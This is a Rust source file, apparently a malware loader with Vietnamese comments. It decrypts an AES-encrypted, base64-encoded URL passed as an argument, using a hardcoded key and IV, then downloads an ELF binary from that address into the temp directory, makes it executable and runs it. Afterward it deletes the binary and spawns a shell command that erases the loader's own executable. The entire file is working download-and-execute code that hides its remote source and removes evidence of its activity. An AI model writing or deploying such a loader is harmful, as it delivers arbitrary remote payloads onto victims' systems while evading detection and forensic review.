use std::{
    env,
    fs::{self, File},
    io,
    os::unix::fs::PermissionsExt,
    path::PathBuf,
    process::Command,
};

use reqwest;
use aes::Aes128;
use aes::cipher::{BlockDecryptMut, KeyIvInit};
use base64::{Engine as _, engine::general_purpose};

// Type alias for AES-128-CBC
type Aes128CbcDec = cbc::Decryptor<Aes128>;

/// Giải mã AES-CBC với key + IV cố định hoặc do bạn định nghĩa.
fn decrypt_base64_aes_cipher(cipher_b64: &str, key: &[u8; 16], iv: &[u8; 16]) -> Result<String, Box<dyn std::error::Error>> {
    let cipher_bytes = general_purpose::STANDARD.decode(cipher_b64)?;
    let cipher = Aes128CbcDec::new_from_slices(key, iv).map_err(|e| format!("AES error: {}", e))?;
    let mut buffer = cipher_bytes.clone();
    let decrypted_data = cipher.decrypt_padded_mut::<aes::cipher::block_padding::Pkcs7>(&mut buffer)
        .map_err(|e| format!("Decryption error: {}", e))?;
    Ok(String::from_utf8(decrypted_data.to_vec())?)
}

fn get_own_path() -> io::Result<PathBuf> {
    env::current_exe()
}

fn download_elf(url: &str, path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let mut response = reqwest::blocking::get(url)?;
    let mut out = File::create(path)?;
    io::copy(&mut response, &mut out)?;
    Ok(())
}

fn make_executable(path: &PathBuf) -> io::Result<()> {
    let mut perms = fs::metadata(path)?.permissions();
    perms.set_mode(0o755);
    fs::set_permissions(path, perms)
}

fn execute_elf(path: &PathBuf) -> io::Result<()> {
    Command::new(path)
        .spawn()?;
    Ok(())
}

fn delete_file(path: &PathBuf) {
    let _ = fs::remove_file(path);
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("Usage: {} <base64_aes_encrypted_domain>", args[0]);
        std::process::exit(1);
    }

    let encrypted_b64 = &args[1];

    // 🔑 Thay đổi key/iv tùy vào mã hóa bạn dùng
    let key = b"e6dc2260348e75ez"; // 16 bytes AES-128 key
    let iv  = b"4d09018a9772dfbb"; // 16 bytes IV

    // 🔓 Giải mã domain
    let domain = decrypt_base64_aes_cipher(encrypted_b64, key, iv)?;
    let elf_url = format!("{}", domain);
    let elf_path = env::temp_dir().join("temp_elf_exec");

    println!("[*] Decrypted URL: {}", elf_url);
    download_elf(&elf_url, &elf_path)?;
    make_executable(&elf_path)?;

    println!("[*] Executing ELF...");
    execute_elf(&elf_path)?;

    // Give the ELF a moment to start
    std::thread::sleep(std::time::Duration::from_secs(2));

    println!("[*] Cleaning up...");
    delete_file(&elf_path);

    if let Ok(own_path) = get_own_path() {
        Command::new("sh")
            .arg("-c")
            .arg(format!(
                "sleep 1 && rm -f '{}'",
                own_path.to_string_lossy()
            ))
            .spawn()?;
    }

    Ok(())
}
